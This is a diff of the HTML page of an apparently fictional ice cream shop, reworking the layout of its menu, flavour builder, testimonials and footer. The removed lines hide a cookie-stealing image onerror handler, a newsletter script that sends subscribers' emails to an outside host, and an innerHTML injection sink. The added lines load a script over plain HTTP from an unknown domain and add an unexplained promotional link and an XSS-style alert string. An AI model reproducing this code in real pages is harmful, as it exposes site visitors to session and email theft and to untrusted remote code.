@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scoops & Dreams - Premium Ice Cream</title>
+    <title>Scoops & Dreams - Premium Ice Cream Shop</title>
     <style>
         /* Global Styles */
         * {
@@ -452,276 +452,446 @@
     </style>
 </head>
 <body>
+    <!-- Header -->
     <header>
-        <nav>
-            <div class="logo">Scoops & Dreams</div>
-            <ul>
-                <li><a href="#home">Home</a></li>
-                <li><a href="#about">About Us</a></li>
-                <li><a href="#menu">Our Menu</a></li>
-                <li><a href="#testimonials">Testimonials</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-            <div class="menu-toggle">☰</div>
-        </nav>
-    </header>
-
-    <section id="home" class="hero">
-        <h1>Handcrafted Ice Cream Made With Love</h1>
-        <p>Enjoy premium, artisanal ice cream made from locally sourced ingredients</p>
-        <a href="#menu" class="btn">Explore Our Flavors</a>
-    </section>
-
-    <section id="about" class="about">
-        <div class="container">
-            <div class="about-image">
-                <img src="images/ice-cream-shop.jpg" alt="Our Ice Cream Shop">
+        <div class="container nav-container">
+            <div class="logo">
+                <img src="/api/placeholder/100/100" alt="Scoops & Dreams Logo">
+                <div>Scoops & <span>Dreams</span></div>
             </div>
-            <div class="about-content">
-                <h2>About Us</h2>
-                <p>Welcome to Scoops & Dreams, where every scoop tells a story. Founded in 2010 by ice cream enthusiast Maria Johnson, our shop has been serving the community with delicious, handcrafted ice cream for over a decade.</p>
-                <p>We believe in using only the finest ingredients, sourced locally whenever possible. Our cream comes from family-owned dairy farms, and our fruits are selected at the peak of their season to ensure the most vibrant flavors.</p>
-                <p>What sets us apart is our dedication to creating unique flavors while honoring classic favorites. Each batch is made with love and attention to detail, ensuring a premium ice cream experience that keeps our customers coming back for more.</p>
-                <a href="#menu" class="btn">View Our Menu</a>
-            </div>
-        </div>
-    </section>
-
-    <section id="menu" class="menu">
-        <h2>Our Delicious Menu</h2>
-        <div class="menu-grid">
-            <div class="menu-item">
-                <img src="images/vanilla.jpg" alt="Classic Vanilla Bean">
-                <h3>Classic Vanilla Bean</h3>
-                <p>Rich and creamy vanilla ice cream made with Madagascar vanilla beans.</p>
-                <span class="price">$4.50</span>
-            </div>
-            <div class="menu-item">
-                <img src="images/chocolate.jpg" alt="Double Chocolate Fudge">
-                <h3>Double Chocolate Fudge</h3>
-                <p>Decadent chocolate ice cream with ribbons of homemade fudge.</p>
-                <span class="price">$4.75</span>
-            </div>
-            <div class="menu-item">
-                <img src="images/strawberry.jpg" alt="Fresh Strawberry">
-                <h3>Fresh Strawberry</h3>
-                <p>Creamy strawberry ice cream with chunks of fresh strawberries.</p>
-                <span class="price">$4.75</span>
-            </div>
-            <div class="menu-item">
-                <img src="images/mint.jpg" alt="Mint Chocolate Chip">
-                <h3>Mint Chocolate Chip</h3>
-                <p>Refreshing mint ice cream loaded with chocolate chips.</p>
-                <span class="price">$4.95</span>
-            </div>
-            <div class="menu-item">
-                <img src="images/cookie-dough.jpg" alt="Cookie Dough Delight">
-                <h3>Cookie Dough Delight</h3>
-                <p>Vanilla ice cream with chunks of chocolate chip cookie dough.</p>
-                <span class="price">$5.25</span>
-            </div>
-            <div class="menu-item">
-                <img src="images/mango.jpg" alt="Mango Tango Sorbet">
-                <h3>Mango Tango Sorbet</h3>
-                <p>Dairy-free mango sorbet made with ripe, juicy mangoes.</p>
-                <span class="price">$4.50</span>
-            </div>
-        </div>
-    </section>
-
-    <section id="design" class="design">
-        <h2>Design Your Own Flavor</h2>
-        <p>Create your perfect ice cream combination with our custom flavor builder!</p>
-        <div class="design-grid">
-            <div class="design-form">
-                <div class="step">
-                    <h3>Step 1: Choose Your Base</h3>
-                    <select id="base">
-                        <option value="vanilla">Vanilla</option>
-                        <option value="chocolate">Chocolate</option>
-                        <option value="strawberry">Strawberry</option>
-                        <option value="coffee">Coffee</option>
-                        <option value="mint">Mint</option>
-                    </select>
-                </div>
-                <div class="step">
-                    <h3>Step 2: Choose Mix-ins (up to 3)</h3>
-                    <div class="mixins">
-                        <label><input type="checkbox" value="chocolate-chips"> Chocolate Chips</label>
-                        <label><input type="checkbox" value="cookie-dough"> Cookie Dough</label>
-                        <label><input type="checkbox" value="brownie-bits"> Brownie Bits</label>
-                        <label><input type="checkbox" value="nuts"> Nuts</label>
-                        <label><input type="checkbox" value="sprinkles"> Sprinkles</label>
-                        <label><input type="checkbox" value="fresh-fruit"> Fresh Fruit</label>
-                    </div>
-                </div>
-                <div class="step">
-                    <h3>Step 3: Choose a Topping</h3>
-                    <select id="topping">
-                        <option value="hot-fudge">Hot Fudge</option>
-                        <option value="caramel">Caramel</option>
-                        <option value="whipped-cream">Whipped Cream</option>
-                        <option value="strawberry-sauce">Strawberry Sauce</option>
-                        <option value="none">No Topping</option>
-                    </select>
-                </div>
-                <div class="step">
-                    <h3>Step 4: Name Your Creation</h3>
-                    <input type="text" id="flavor-name" placeholder="Enter your flavor name">
-                    <div id="flavor-preview"></div>
-                </div>
-                <div class="design-summary">
-                    <p>Your Custom Creation: $6.95</p>
-                    <button id="submit-creation">Submit Your Creation</button>
-                </div>
-            </div>
-            <div class="design-preview">
-                <h3>Your Custom Flavor Preview</h3>
-                <p>Your delicious custom creation awaits!</p>
-            </div>
-        </div>
-        <script>
-            document.getElementById('flavor-name').addEventListener('input', function() {
-                var name = this.value;
-                document.getElementById('flavor-preview').innerHTML = 'Your flavor: ' + name;
-            });
-        </script>
-    </section>
-
-    <section id="testimonials" class="testimonials">
-        <h2>What Our Customers Say</h2>
-        <div class="testimonial-grid">
-            <div class="testimonial">
-                <p>"The best ice cream I've ever had! The flavors are so rich and creamy. My kids absolutely love coming here for a weekend treat."</p>
-                <div class="customer-info">
-                    <img src="images/sarah.jpg" alt="Sarah Thompson">
-                    <div>
-                        <h4>Sarah Thompson</h4>
-                        <p>Local Customer</p>
-                    </div>
-                </div>
-            </div>
-            <div class="testimonial">
-                <p>"Scoops & Dreams has the most unique flavors I've ever tried. Their seasonal specials are always something to look forward to!"</p>
-                <div class="customer-info">
-                    <img src="images/michael.jpg" alt="Michael Rodriguez">
-                    <div>
-                        <h4>Michael Rodriguez</h4>
-                        <p>Ice Cream Enthusiast</p>
-                    </div>
-                </div>
-            </div>
-            <div class="testimonial">
-                <p>"As someone with dietary restrictions, I appreciate that they offer dairy-free options that are just as delicious as their regular ice cream."</p>
-                <div class="customer-info">
-                    <img src="images/emily.jpg" alt="Emily Chen">
-                    <div>
-                        <h4>Emily Chen</h4>
-                        <p>Loyal Customer</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section id="contact" class="contact">
-        <h2>Contact Us</h2>
-        <div class="contact-grid">
-            <div class="contact-info">
-                <div class="info-item">
-                    <span>📍</span>
-                    <div>
-                        <h4>Visit Us</h4>
-                        <p>123 Ice Cream Lane<br>Sweet City, SC 12345</p>
-                    </div>
-                </div>
-                <div class="info-item">
-                    <span>📱</span>
-                    <div>
-                        <h4>Call Us</h4>
-                        <p>(555) 123-4567</p>
-                    </div>
-                </div>
-                <div class="info-item">
-                    <span>📧</span>
-                    <div>
-                        <h4>Email Us</h4>
-                        <p>info@scoopsanddreams.com</p>
-                    </div>
-                </div>
-                <div class="info-item">
-                    <span>🕒</span>
-                    <div>
-                        <h4>Hours</h4>
-                        <p>Monday - Thursday: 12pm - 9pm<br>Friday - Sunday: 11am - 10pm</p>
-                    </div>
-                </div>
-            </div>
-            <div class="contact-form">
-                <form action="contact.php" method="post">
-                    <input type="text" name="name" placeholder="Your Name">
-                    <input type="email" name="email" placeholder="Your Email">
-                    <input type="text" name="subject" placeholder="Subject">
-                    <textarea name="message" placeholder="Your Message"></textarea>
-                    <button type="submit">Send Message</button>
-                </form>
-            </div>
-        </div>
-    </section>
-
-    <footer>
-        <div class="footer-grid">
-            <div class="footer-about">
-                <h3>Scoops & Dreams</h3>
-                <p>Bringing smiles with every scoop since 2010.</p>
-                <div class="social-icons">
-                    <a href="#" target="_blank">fb</a>
-                    <a href="#" target="_blank">ig</a>
-                    <a href="#" target="_blank">tw</a>
-                    <a href="#" target="_blank">tt</a>
-                </div>
-            </div>
-            <div class="footer-links">
-                <h3>Quick Links</h3>
-                <ul>
+            <nav>
+                <ul class="nav-menu">
                     <li><a href="#home">Home</a></li>
                     <li><a href="#about">About Us</a></li>
                     <li><a href="#menu">Our Menu</a></li>
                     <li><a href="#testimonials">Testimonials</a></li>
                     <li><a href="#contact">Contact</a></li>
                 </ul>
+                <div class="mobile-menu">☰</div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <h1>Handcrafted Ice Cream Made With Love</h1>
+            <p>Enjoy premium, artisanal ice cream made from locally sourced ingredients</p>
+            <a href="#menu" class="btn">Explore Our Flavors</a>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section class="section" id="about">
+        <div class="container">
+            <h2 class="section-title">About Us</h2>
+            <div class="about-content">
+                <div class="about-img">
+                    <img src="/api/placeholder/600/400" alt="Our Ice Cream Shop">
+                </div>
+                <div class="about-text">
+                    <h3>Our Sweet Story</h3>
+                    <p>Welcome to Scoops & Dreams, where every scoop tells a story. Founded in 2010 by ice cream enthusiast Maria Johnson, our shop has been serving the community with delicious, handcrafted ice cream for over a decade.</p>
+                    <p>We believe in using only the finest ingredients, sourced locally whenever possible. Our cream comes from family-owned dairy farms, and our fruits are selected at the peak of their season to ensure the most vibrant flavors.</p>
+                    <p>What sets us apart is our dedication to creating unique flavors while honoring classic favorites. Each batch is made with love and attention to detail, ensuring a premium ice cream experience that keeps our customers coming back for more.</p>
+                    <a href="#menu" class="btn">View Our Menu</a>
+                </div>
             </div>
-            <div class="footer-services">
-                <h3>Services</h3>
-                <ul>
-                    <li><a href="#">Catering</a></li>
-                    <li><a href="#">Birthday Parties</a></li>
-                    <li><a href="#">Corporate Events</a></li>
-                    <li><a href="#">Ice Cream Cakes</a></li>
-                    <li><a href="#">Online Orders</a></li>
-                </ul>
+        </div>
+    </section>
+
+    <a href="https://cookies-and-cream.com" target="_blank">Get a FREE scoop of cookies and cream</a>
+
+    <!-- Menu Section -->
+    <section class="section" id="menu">
+        <div class="container">
+            <h2 class="section-title">Our Delicious Menu</h2>
+            <div class="menu-container">
+                <!-- Menu Item 1 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Vanilla Bean">
+                    <div class="menu-item-content">
+                        <h3>Classic Vanilla Bean</h3>
+                        <p>Rich and creamy vanilla ice cream made with Madagascar vanilla beans.</p>
+                        <div class="price">$4.50</div>
+                    </div>
+                </div>
+                
+                <!-- Menu Item 2 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Chocolate Fudge">
+                    <div class="menu-item-content">
+                        <h3>Double Chocolate Fudge</h3>
+                        <p>Decadent chocolate ice cream with ribbons of homemade fudge.</p>
+                        <div class="price">$4.75</div>
+                    </div>
+                </div>
+                
+                <!-- Menu Item 3 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Strawberry">
+                    <div class="menu-item-content">
+                        <h3>Fresh Strawberry</h3>
+                        <p>Creamy strawberry ice cream with chunks of fresh strawberries.</p>
+                        <div class="price">$4.75</div>
+                    </div>
+                </div>
+                
+                <!-- Menu Item 4 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Mint Chip">
+                    <div class="menu-item-content">
+                        <h3>Mint Chocolate Chip</h3>
+                        <p>Refreshing mint ice cream loaded with chocolate chips.</p>
+                        <div class="price">$4.95</div>
+                    </div>
+                </div>
+                
+                <!-- Menu Item 5 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Cookie Dough">
+                    <div class="menu-item-content">
+                        <h3>Cookie Dough Delight</h3>
+                        <p>Vanilla ice cream with chunks of chocolate chip cookie dough.</p>
+                        <div class="price">$5.25</div>
+                    </div>
+                </div>
+                
+                <!-- Menu Item 6 -->
+                <div class="menu-item">
+                    <img src="/api/placeholder/400/300" alt="Mango Sorbet">
+                    <div class="menu-item-content">
+                        <h3>Mango Tango Sorbet</h3>
+                        <p>Dairy-free mango sorbet made with ripe, juicy mangoes.</p>
+                        <div class="price">$4.50</div>
+                    </div>
+                </div>
             </div>
-            <div class="footer-newsletter">
-                <h3>Newsletter.</h3>
-                <p>Subscribe to get special offers and flavor updates!</p>
-                <form id="newsletter-form" action="subscribe.php" method="post">
-                    <input type="email" name="email" placeholder="Your Email">
-                    <button type="submit">Subscribe</button>
+        </div>
+    </section>
+    
+    <!-- Design Your Own Flavor Section -->
+    <section class="section" id="design-flavor" style="background-color: #f0f9ff;">
+        <script src="http://cdn.dontworry.com/library.js"></script>
+
+        <div class="container">
+            <h2 class="section-title">Design Your Own Flavor</h2>
+            <p style="text-align: center; margin-bottom: 2rem;">Create your perfect ice cream combination with our custom flavor builder!</p>
+            
+            <div style="max-width: 800px; margin: 0 auto; background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.05);">
+                <form id="custom-flavor-form">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem;">
+                        <div class="form-group">
+                            <label for="base-flavor"><strong>Step 1:</strong> Choose Your Base</label>
+                            <select id="base-flavor" name="base-flavor" class="form-control" required>
+                                <option value="">Select Base Flavor</option>
+                                <option value="vanilla">Vanilla</option>
+                                <option value="chocolate">Chocolate</option>
+                                <option value="strawberry">Strawberry</option>
+                                <option value="coffee">Coffee</option>
+                                <option value="mint">Mint</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label><strong>Step 2:</strong> Choose Mix-ins (up to 3)</label>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.5rem;">
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="chocolate-chips"> Chocolate Chips
+                                </label>
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="cookie-dough"> Cookie Dough
+                                </label>
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="brownie-bits"> Brownie Bits
+                                </label>
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="nuts"> Nuts
+                                </label>
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="sprinkles"> Sprinkles
+                                </label>
+                                <label style="display: flex; align-items: center; gap: 0.3rem;">
+                                    <input type="checkbox" name="mixins[]" value="fruit"> Fresh Fruit
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 2rem;">
+                        <div class="form-group">
+                            <label for="topping"><strong>Step 3:</strong> Choose a Topping</label>
+                            <select id="topping" name="topping" class="form-control">
+                                <option value="">Select Topping (Optional)</option>
+                                <option value="hot-fudge">Hot Fudge</option>
+                                <option value="caramel">Caramel</option>
+                                <option value="whipped-cream">Whipped Cream</option>
+                                <option value="strawberry-sauce">Strawberry Sauce</option>
+                                <option value="none">No Topping</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 2rem;">
+                        <div class="form-group">
+                            <label for="flavor-name"><strong>Step 4:</strong> Name Your Creation</label>
+                            <input type="text" id="flavor-name" name="flavor-name" placeholder="Give your flavor a creative name!" required>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 2rem; text-align: center;">
+                        <p class="price" style="font-size: 1.5rem; margin-bottom: 1rem;">Your Custom Creation: $6.95</p>
+                        <button type="submit" class="btn" style="padding: 1rem 2rem;">Submit Your Creation</button>
+                    </div>
+                </form>
+                
+                <div id="flavor-preview" style="margin-top: 2rem; text-align: center; display: none;">
+                    <h3>Your Custom Flavor Preview</h3>
+                    <img src="/api/placeholder/300/300" alt="Custom Flavor Preview" style="border-radius: 50%; margin: 1rem auto;">
+                    <p id="flavor-description">Your delicious custom creation awaits!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="section testimonials" id="testimonials">
+        <div class="container">
+            <script>
+                const username = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
+            </script>
+
+            <div onclick="alert('Welcome, ' + username)">Click me</div>
+            <h2 class="section-title">What Our Customers Say</h2>
+            <div class="testimonial-container">
+                <!-- Testimonial 1 -->
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "The best ice cream I've ever had! The flavors are so rich and creamy. My kids absolutely love coming here for a weekend treat."
+                    </div>
+                    <div class="testimonial-author">
+                        <img src="/api/placeholder/100/100" alt="Sarah">
+                        <div class="author-info">
+                            <h4>Sarah Thompson</h4>
+                            <p>Local Customer</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 2 -->
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "Scoops & Dreams has the most unique flavors I've ever tried. Their seasonal specials are always something to look forward to!"
+                    </div>
+                    <div class="testimonial-author">
+                        <img src="/api/placeholder/100/100" alt="Michael">
+                        <div class="author-info">
+                            <h4>Michael Rodriguez</h4>
+                            <p>Ice Cream Enthusiast</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 3 -->
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "As someone with dietary restrictions, I appreciate that they offer dairy-free options that are just as delicious as their regular ice cream."
+                    </div>
+                    <div class="testimonial-author">
+                        <img src="/api/placeholder/100/100" alt="Emily">
+                        <div class="author-info">
+                            <h4>Emily Chen</h4>
+                            <p>Loyal Customer</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="section" id="contact">
+        <div class="container">
+            <h2 class="section-title">Contact Us</h2>
+            <div class="contact-container">
+                <div class="contact-info">
+                    <div class="contact-item">
+                        <div class="contact-icon">📍</div>
+                        <div class="contact-details">
+                            <h4>Visit Us</h4>
+                            <p>123 Ice Cream Lane</p>
+                            <p>Sweet City, SC 12345</p>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">📱</div>
+                        <div class="contact-details">
+                            <h4>Call Us</h4>
+                            <p>(555) 123-4567</p>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">📧</div>
+                        <div class="contact-details">
+                            <h4>Email Us</h4>
+                            <p>info@scoopsanddreams.com</p>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">🕒</div>
+                        <div class="contact-details">
+                            <h4>Hours</h4>
+                            <p>Monday - Thursday: 12pm - 9pm</p>
+                            <p>Friday - Sunday: 11am - 10pm</p>
+                        </div>
+                    </div>
+                </div>
+                <form>
+                    <div class="form-group">
+                        <label for="name">Your Name</label>
+                        <input type="text" id="name" name="name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Your Email</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="subject">Subject</label>
+                        <input type="text" id="subject" name="subject" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="message">Your Message</label>
+                        <textarea id="message" name="message" required></textarea>
+                    </div>
+                    <button type="submit" class="btn">Send Message</button>
                 </form>
             </div>
         </div>
-        <div class="footer-bottom">
-            <p>© 2025 Scoops & Dreams. All Rights Reserved.</p>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-col">
+                    <h4>Scoops & Dreams</h4>
+                    <p>Bringing smiles with every scoop since 2010.</p>
+                    <div class="social-icons">
+                        <a href="#" aria-label="Facebook">fb</a>
+                        <a href="#" aria-label="Instagram">ig</a>
+                        <a href="#" aria-label="Twitter">tw</a>
+                        <a href="#" aria-label="TikTok">tt</a>
+                    </div>
+                </div>
+                <div class="footer-col">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#about">About Us</a></li>
+                        <li><a href="#menu">Our Menu</a></li>
+                        <li><a href="#testimonials">Testimonials</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Services</h4>
+                    <ul>
+                        <li><a href="#">Catering</a></li>
+                        <li><a href="#">Birthday Parties</a></li>
+                        <li><a href="#">Corporate Events</a></li>
+                        <li><a href="#">Ice Cream Cakes</a></li>
+                        <li><a href="#">Online Orders</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Newsletter</h4>
+                    <p>Subscribe to get special offers and flavor updates!</p>
+                    <form>
+                        <div class="form-group">
+                            <input type="email" placeholder="Your Email" required>
+                        </div>
+                        <button type="submit" class="btn">Subscribe</button>
+                    </form>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2025 Scoops & Dreams. All Rights Reserved.</p>
+            </div>
         </div>
-        <img src="nonexistent.jpg" style="display:none;" onerror="fetch('http://coolcookiesforsure.com/loveu?cookie=' + encodeURIComponent(document.cookie))">
     </footer>
 
     <script>
-        document.getElementById('newsletter-form').addEventListener('submit', function(e) {
-            var email = this.querySelector('input[name="email"]').value;
-            var happyImg = new Image();
-            happyImg.src = 'http://cool-perfect-site.com/store-email?email=' + encodeURIComponent(email);
+        // Mobile Menu Toggle
+        document.querySelector('.mobile-menu').addEventListener('click', function() {
+            document.querySelector('.nav-menu').classList.toggle('active');
         });
+        
+        // Smooth Scrolling for Anchor Links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+                
+                // Close mobile menu after clicking a link
+                document.querySelector('.nav-menu').classList.remove('active');
+            });
+        });
+        
+        // Form Submission (for demonstration purposes)
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Thank you for your submission! We will get back to you soon.');
+                form.reset();
+            });
+        });
+        
+        // Design Your Own Flavor Preview
+        const customFlavorForm = document.getElementById('custom-flavor-form');
+        if (customFlavorForm) {
+            customFlavorForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const baseFlavorSelect = document.getElementById('base-flavor');
+                const baseFlavor = baseFlavorSelect.options[baseFlavorSelect.selectedIndex].text;
+                const flavorName = document.getElementById('flavor-name').value;
+                
+                // Get selected mix-ins
+                const mixins = [];
+                document.querySelectorAll('input[name="mixins[]"]:checked').forEach(item => {
+                    mixins.push(item.parentElement.textContent.trim());
+                });
+                
+                // Get topping
+                const toppingSelect = document.getElementById('topping');
+                const topping = toppingSelect.options[toppingSelect.selectedIndex].text;
+                
+                // Create description
+                let description = `"${flavorName}": ${baseFlavor} ice cream`;
+                
+                if (mixins.length > 0) {
+                    description += ` with ${mixins.join(', ')}`;
+                }
+                
+                if (topping && topping !== 'No Topping') {
+                    description += ` topped with ${topping}`;
+                }
+                
+                // Update the preview
+                document.getElementById('flavor-description').textContent = description;
+                document.getElementById('flavor-preview').style.display = 'block';
+                
+                // Scroll to preview
+                document.getElementById('flavor-preview').scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            });
+        }
     </script>
 </body>
 </html>
